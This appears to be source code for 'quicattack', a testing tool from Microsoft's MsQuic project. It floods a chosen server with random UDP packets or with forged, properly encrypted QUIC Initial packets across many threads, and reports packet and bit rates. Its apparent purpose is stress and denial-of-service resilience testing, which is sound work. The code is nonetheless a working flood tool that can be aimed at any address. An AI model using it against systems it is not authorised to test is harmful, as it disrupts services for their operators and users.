/*++

    Copyright (c) Microsoft Corporation.
    Licensed under the MIT License.

--*/

#pragma warning(disable:4200)  // nonstandard extension used: bit field types other than int
#pragma warning(disable:4201)  // nonstandard extension used: nameless struct/union
#pragma warning(disable:4204)  // nonstandard extension used: non-constant aggregate initializer
#pragma warning(disable:4214)  // nonstandard extension used: zero-sized array in struct/union
#pragma warning(disable:28931) // Unused Assignment

#include "precomp.h" // from 'core' dir
#include "msquichelper.h"

#include "packet_writer.h"

#define US_TO_MS(x) ((x) / 1000)

#define QUIC_MIN_INITIAL_LENGTH 1200

#define ATTACK_TIMEOUT_DEFAULT_MS (60 * 1000)

#define ATTACK_THREADS_DEFAULT CxPlatProcActiveCount()

#define ATTACK_PORT_DEFAULT 443

const QUIC_HKDF_LABELS HkdfLabels = { "quic key", "quic iv", "quic hp", "quic ku" };

static CXPLAT_DATAPATH* Datapath;
static PacketWriter* Writer;

static uint32_t AttackType;
static const char* ServerName;
static const char* IpAddress;
static QUIC_ADDR ServerAddress;
static uint64_t TimeoutMs = ATTACK_TIMEOUT_DEFAULT_MS;
static uint32_t ThreadCount = ATTACK_THREADS_DEFAULT;
static const char* Alpn = "h3-29";
static uint32_t Version = QUIC_VERSION_DRAFT_29;

static uint64_t TimeStart;
static int64_t TotalPacketCount;
static int64_t TotalByteCount;

void PrintUsage()
{
    printf("quicattack is used for generating attack traffic towards a designated server.\n\n");

    printf("Usage:\n");
    printf("  quicattack.exe -list\n\n");
    printf("  quicattack.exe -type:<number> -ip:<ip_address_and_port> [-alpn:<protocol_name>] [-sni:<host_name>] [-timeout:<ms>] [-threads:<count>]\n\n");
}

void PrintUsageList()
{
    printf("The following are the different types of attacks supported by the tool.\n\n");

    printf("#1 - Random UDP 1 byte UDP packets.\n");
    printf("#2 - Random UDP full length UDP packets.\n");
    printf("#3 - Random QUIC Initial packets.\n");
    printf("#4 - Valid QUIC initial packets.\n");
}

struct StrBuffer
{
    uint8_t* Data;
    uint16_t Length;

    StrBuffer(const char* HexBytes)
    {
        Length = (uint16_t)(strlen(HexBytes) / 2);
        Data = new uint8_t[Length];

        for (uint16_t i = 0; i < Length; ++i) {
            Data[i] =
                (DecodeHexChar(HexBytes[i * 2]) << 4) |
                DecodeHexChar(HexBytes[i * 2 + 1]);
        }
    }

    ~StrBuffer() { delete [] Data; }
};

_IRQL_requires_max_(DISPATCH_LEVEL)
_Function_class_(CXPLAT_DATAPATH_RECEIVE_CALLBACK)
void
UdpRecvCallback(
    _In_ CXPLAT_SOCKET* /* Binding */,
    _In_ void* /* Context */,
    _In_ CXPLAT_RECV_DATA* RecvBufferChain
    )
{
    CxPlatRecvDataReturn(RecvBufferChain);
}

_IRQL_requires_max_(DISPATCH_LEVEL)
_Function_class_(CXPLAT_DATAPATH_UNREACHABLE_CALLBACK)
void
UdpUnreachCallback(
    _In_ CXPLAT_SOCKET* /* Binding */,
    _In_ void* /* Context */,
    _In_ const QUIC_ADDR* /* RemoteAddress */
    )
{
}

void RunAttackRandom(CXPLAT_SOCKET* Binding, uint16_t Length, bool ValidQuic)
{
    CXPLAT_ROUTE Route;
    CxPlatSocketGetLocalAddress(Binding, &Route.LocalAddress);
    Route.RemoteAddress = ServerAddress;

    uint64_t ConnectionId = 0;
    CxPlatRandom(sizeof(ConnectionId), &ConnectionId);

    while (CxPlatTimeDiff64(TimeStart, CxPlatTimeMs64()) < TimeoutMs) {

        CXPLAT_SEND_DATA* SendData =
            CxPlatSendDataAlloc(
                Binding, CXPLAT_ECN_NON_ECT, Length, &Route);
        if (SendData == nullptr) {
            printf("CxPlatSendDataAlloc failed\n");
            return;
        }

        while (!CxPlatSendDataIsFull(SendData)) {
            QUIC_BUFFER* SendBuffer =
                CxPlatSendDataAllocBuffer(SendData, Length);
            if (SendBuffer == nullptr) {
                printf("CxPlatSendDataAllocBuffer failed\n");
                CxPlatSendDataFree(SendData);
                return;
            }

            CxPlatRandom(Length, SendBuffer->Buffer);

            if (ValidQuic) {
                QUIC_LONG_HEADER_V1* Header =
                    (QUIC_LONG_HEADER_V1*)SendBuffer->Buffer;
                Header->IsLongHeader = 1;
                Header->Type = QUIC_INITIAL_V1;
                Header->FixedBit = 1;
                Header->Reserved = 0;
                Header->Version = QUIC_VERSION_LATEST;
                Header->DestCidLength = 8;
                ConnectionId++;
                CxPlatCopyMemory(Header->DestCid, &ConnectionId, sizeof(ConnectionId));
                Header->DestCid[8] = 8;
                Header->DestCid[17] = 0;
                QuicVarIntEncode(
                    Length - (MIN_LONG_HEADER_LENGTH_V1 + 19),
                    Header->DestCid + 18);
            }

            InterlockedExchangeAdd64(&TotalPacketCount, 1);
            InterlockedExchangeAdd64(&TotalByteCount, Length);
        }

        VERIFY(
        QUIC_SUCCEEDED(
        CxPlatSocketSend(
            Binding,
            &Route,
            SendData,
            (uint16_t)CxPlatProcCurrentNumber())));
    }
}

#if DEBUG
void printf_buf(const char* name, void* buf, uint32_t len)
{
    printf("%s: ", name);
    for (uint32_t i = 0; i < len; i++) {
        printf("%.2X", ((uint8_t*)buf)[i]);
    }
    printf("\n");
}
#else
#define printf_buf(name, buf, len)
#endif

void RunAttackValidInitial(CXPLAT_SOCKET* Binding)
{
    const StrBuffer InitialSalt("afbfec289993d24c9e9786f19c6111e04390a899");
    const uint16_t DatagramLength = QUIC_MIN_INITIAL_LENGTH;
    const uint64_t PacketNumber = 0;

    CXPLAT_ROUTE Route;
    CxPlatSocketGetLocalAddress(Binding, &Route.LocalAddress);
    Route.RemoteAddress = ServerAddress;

    uint8_t Packet[512] = {0};
    uint16_t PacketLength, HeaderLength;
    Writer->WriteClientInitialPacket(
        PacketNumber,
        sizeof(uint64_t),
        sizeof(Packet),
        Packet,
        &PacketLength,
        &HeaderLength);
    uint16_t PacketNumberOffset = HeaderLength - sizeof(uint32_t);

    uint64_t* DestCid = (uint64_t*)(Packet + sizeof(QUIC_LONG_HEADER_V1));
    uint64_t* SrcCid = (uint64_t*)(Packet + sizeof(QUIC_LONG_HEADER_V1) + sizeof(uint64_t) + sizeof(uint8_t));

    uint64_t* OrigSrcCid = nullptr;
    for (uint16_t i = HeaderLength; i < PacketLength; ++i) {
        if (MagicCid == *(uint64_t*)&Packet[i]) {
            OrigSrcCid = (uint64_t*)&Packet[i];
        }
    }
    if (!OrigSrcCid) {
        printf("Failed to find OrigSrcCid!\n");
        return;
    }

    CxPlatRandom(sizeof(uint64_t), DestCid);
    CxPlatRandom(sizeof(uint64_t), SrcCid);

    while (CxPlatTimeDiff64(TimeStart, CxPlatTimeMs64()) < TimeoutMs) {

        CXPLAT_SEND_DATA* SendData =
            CxPlatSendDataAlloc(
                Binding, CXPLAT_ECN_NON_ECT, DatagramLength, &Route);
        VERIFY(SendData);

        while (CxPlatTimeDiff64(TimeStart, CxPlatTimeMs64()) < TimeoutMs &&
            !CxPlatSendDataIsFull(SendData)) {
            QUIC_BUFFER* SendBuffer =
                CxPlatSendDataAllocBuffer(SendData, DatagramLength);
            VERIFY(SendBuffer);

            (*DestCid)++; (*SrcCid)++;
            *OrigSrcCid = *SrcCid;
            memcpy(SendBuffer->Buffer, Packet, PacketLength);

            printf_buf("cleartext", SendBuffer->Buffer, PacketLength - CXPLAT_ENCRYPTION_OVERHEAD);

            QUIC_PACKET_KEY* WriteKey;
            VERIFY(
            QUIC_SUCCEEDED(
            QuicPacketKeyCreateInitial(
                FALSE,
                &HkdfLabels,
                InitialSalt.Data,
                sizeof(uint64_t),
                (uint8_t*)DestCid,
                nullptr,
                &WriteKey)));

            printf_buf("salt", InitialSalt.Data, InitialSalt.Length);
            printf_buf("cid", DestCid, sizeof(uint64_t));

            uint8_t Iv[CXPLAT_IV_LENGTH];
            QuicCryptoCombineIvAndPacketNumber(
                WriteKey->Iv, (uint8_t*)&PacketNumber, Iv);

            CxPlatEncrypt(
                WriteKey->PacketKey,
                Iv,
                HeaderLength,
                SendBuffer->Buffer,
                PacketLength - HeaderLength,
                SendBuffer->Buffer + HeaderLength);

            printf_buf("encrypted", SendBuffer->Buffer, PacketLength);

            uint8_t HpMask[16];
            CxPlatHpComputeMask(
                WriteKey->HeaderKey,
                1,
                SendBuffer->Buffer + HeaderLength,
                HpMask);

            printf_buf("cipher_text", SendBuffer->Buffer + HeaderLength, 16);
            printf_buf("hp_mask", HpMask, 16);

            QuicPacketKeyFree(WriteKey);

            SendBuffer->Buffer[0] ^= HpMask[0] & 0x0F;
            for (uint8_t i = 0; i < 4; ++i) {
                SendBuffer->Buffer[PacketNumberOffset + i] ^= HpMask[i + 1];
            }

            printf_buf("protected", SendBuffer->Buffer, PacketLength);

            InterlockedExchangeAdd64(&TotalPacketCount, 1);
            InterlockedExchangeAdd64(&TotalByteCount, DatagramLength);
        }

        VERIFY(
        QUIC_SUCCEEDED(
        CxPlatSocketSend(
            Binding,
            &Route,
            SendData,
            (uint16_t)CxPlatProcCurrentNumber())));
    }
}

CXPLAT_THREAD_CALLBACK(RunAttackThread, /* Context */)
{
    CXPLAT_SOCKET* Binding;
    CXPLAT_UDP_CONFIG UdpConfig = {0};
    UdpConfig.LocalAddress = nullptr;
    UdpConfig.RemoteAddress = &ServerAddress;
    UdpConfig.Flags = 0;
    UdpConfig.InterfaceIndex = 0;
    UdpConfig.CallbackContext = nullptr;
    QUIC_STATUS Status =
        CxPlatSocketCreateUdp(
            Datapath,
            &UdpConfig,
            &Binding);
    if (QUIC_FAILED(Status)) {
        printf("CxPlatSocketCreateUdp failed, 0x%x\n", Status);
        CXPLAT_THREAD_RETURN(Status);
    }

    switch (AttackType) {
    case 1:
        RunAttackRandom(Binding, 1, false);
        break;
    case 2:
        RunAttackRandom(Binding, QUIC_MIN_INITIAL_LENGTH, false);
        break;
    case 3:
        RunAttackRandom(Binding, QUIC_MIN_INITIAL_LENGTH, true);
        break;
    case 4:
        RunAttackValidInitial(Binding);
        break;
    default:
        break;
    }

    CxPlatSocketDelete(Binding);

    CXPLAT_THREAD_RETURN(QUIC_STATUS_SUCCESS);
}

void RunAttack()
{
    Writer = new PacketWriter(Version, Alpn, ServerName);

    CXPLAT_THREAD* Threads =
        (CXPLAT_THREAD*)CXPLAT_ALLOC_PAGED(ThreadCount * sizeof(CXPLAT_THREAD), QUIC_POOL_TOOL);

    uint32_t ProcCount = CxPlatProcActiveCount();
    TimeStart = CxPlatTimeMs64();

    for (uint32_t i = 0; i < ThreadCount; ++i) {
        CXPLAT_THREAD_CONFIG ThreadConfig = {
            CXPLAT_THREAD_FLAG_SET_AFFINITIZE,
            (uint8_t)(i % ProcCount),
            "AttackRunner",
            RunAttackThread,
            nullptr
        };
        CxPlatThreadCreate(&ThreadConfig, &Threads[i]);
    }

    for (uint32_t i = 0; i < ThreadCount; ++i) {
        CxPlatThreadWait(&Threads[i]);
        CxPlatThreadDelete(&Threads[i]);
    }

    uint64_t TimeEnd = CxPlatTimeMs64();
    printf("Packet Rate: %llu KHz\n", (unsigned long long)(TotalPacketCount) / CxPlatTimeDiff64(TimeStart, TimeEnd));
    printf("Bit Rate: %llu mbps\n", (unsigned long long)(8 * TotalByteCount) / (1000 * CxPlatTimeDiff64(TimeStart, TimeEnd)));
    CXPLAT_FREE(Threads, QUIC_POOL_TOOL);

    delete Writer;
}

int
QUIC_MAIN_EXPORT
main(
    _In_ int argc,
    _In_reads_(argc) _Null_terminated_ char* argv[]
    )
{
    int ErrorCode = -1;
    const CXPLAT_UDP_DATAPATH_CALLBACKS DatapathCallbacks = {
        UdpRecvCallback,
        UdpUnreachCallback,
    };

    CxPlatSystemLoad();
    CxPlatInitialize();
    CxPlatDataPathInitialize(
        0,
        &DatapathCallbacks,
        NULL,
        NULL,
        &Datapath);

    if (argc < 2) {
        PrintUsage();
        goto Error;
    }

    if (strcmp("-list", argv[1]) == 0) {
        PrintUsageList();
        ErrorCode = 0;

    } else {
        if (!TryGetValue(argc, argv, "type", &AttackType)) {
            PrintUsage();
            goto Error;
        }

        if (AttackType < 1 || AttackType > 4) {
            printf("Invalid -type:'%u' specified!\n", AttackType);
            goto Error;
        }

        TryGetValue(argc, argv, "ip", &IpAddress);
        TryGetValue(argc, argv, "alpn", &Alpn);
        TryGetValue(argc, argv, "sni", &ServerName);
        TryGetValue(argc, argv, "timeout", &TimeoutMs);
        TryGetValue(argc, argv, "threads", &ThreadCount);

        if (IpAddress == nullptr) {
            if (ServerName == nullptr) {
                printf("'ip' or 'sni' must be specified!\n");
                goto Error;
            }
            if (QUIC_FAILED(
                CxPlatDataPathResolveAddress(
                    Datapath,
                    ServerName,
                    &ServerAddress))) {
                printf("Failed to resolve IP address of '%s'.\n", ServerName);
                goto Error;
            }
            QuicAddrSetPort(&ServerAddress, ATTACK_PORT_DEFAULT);
        } else {
            if (!QuicAddrFromString(IpAddress, ATTACK_PORT_DEFAULT, &ServerAddress)) {
                printf("Invalid -ip:'%s' specified!\n", IpAddress);
                goto Error;
            }
        }

        if (ServerAddress.Ipv4.sin_port == 0) {
            printf("A UDP port must be specified with the IP address.\n");
            goto Error;
        }

        RunAttack();
        ErrorCode = 0;
    }

Error:

    CxPlatDataPathUninitialize(Datapath);
    CxPlatUninitialize();
    CxPlatSystemUnload();

    return ErrorCode;
}
